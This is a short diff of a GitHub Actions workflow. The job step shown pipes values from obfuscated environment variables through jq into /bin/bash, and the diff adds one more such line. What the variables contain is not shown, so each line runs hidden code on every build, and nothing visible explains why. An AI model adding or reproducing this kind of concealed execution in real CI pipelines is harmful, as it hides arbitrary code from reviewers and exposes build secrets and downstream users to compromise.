@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$m53422" | jq -r .qkj4 | /bin/bash
           echo $ioi15248 | jq -r .g88 | /bin/bash
           printf '%s' "$io0" | jq -r .iu3 | /bin/bash
+          echo $bj718 | jq -r .kmyc38 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
